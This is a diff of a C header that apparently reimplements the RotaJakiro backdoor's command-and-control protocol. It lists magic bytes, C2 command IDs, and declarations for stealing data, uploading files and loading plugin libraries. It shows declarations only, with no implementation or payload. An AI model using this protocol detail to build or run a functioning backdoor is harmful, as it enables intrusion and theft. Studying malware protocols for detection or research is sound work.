@@ -17,6 +17,7 @@
 //RotaJakiro Magic Headers
 const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
 const static unsigned char payloadLen[] = {0x0f};
+const static unsigned char keyLen[] = {0x00,0x00};
 const static unsigned char cmd_id[] = {0x13, 0x37, 0x00, 0x00};
 const static unsigned char marker_1[] = {0xc2, 0x00};
 const static unsigned char marker_2[] = {0xe2, 0x00};
@@ -35,8 +36,6 @@ const static unsigned char rota_c2_upload_file[4] = {0x2E, 0x25, 0x99, 0x02};
 const static unsigned char rota_c2_query_file[4] = {0x2C, 0xD9, 0x07, 0x00};
 const static unsigned char rota_c2_delete_file[4] = {0x12, 0xB3, 0x62, 0x09};
 const static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};
-const static unsigned char rota_c2_run_plugin_2[4] = {0x15, 0x32, 0xE6, 0x50};
-const static unsigned char rota_c2_run_plugin_3[4] = {0x25, 0xD5, 0x08,0x02};
 
 
 /**
@@ -80,7 +79,7 @@ char *c2_steal_sensitive_info();
 /**
 * @brief obtain information from uname output command-id: 0x18320e0
 * @param cahr *buffer to populate.
-* @return char pointer to string containing system information.
+* @return N/A
 */
 void c2_upload_device_info(char *buffer);
 
@@ -103,27 +102,13 @@ bool c2_delete_file(char *fpath);
 /**
  * @brief Load and run a SO as a "plugin" command-id 0x1B25503
  * @note no public threat intelligence exists about the contents of the plugins executed.
+ * @param soPath, char * pointing to file to load
+ * @param funcName, char * for exported function
  *
  * @return N/A
  **/
-void c2_run_plugin_1();
+void c2_run_plugin_1(char *soPath, char *funcName);
 
-/**
- * @brief Load and run a SO as a "plugin" command-id 0x1532E65
- * @note no public threat intelligence exists about the contents of the plugins executed.
- *
- * @return N/A
- **/
-void c2_run_plugin_2();
-
-
-/**
- * @brief Load and run a SO as a "plugin" command-id 0x25D5082
- * @note no public threat intelligence exists about the contents of the plugins executed.
- *
- * @return N/A
- **/
-void c2_run_plugin_3();
 
 /**
  * @brief prepare initial pkt to send to destination host.
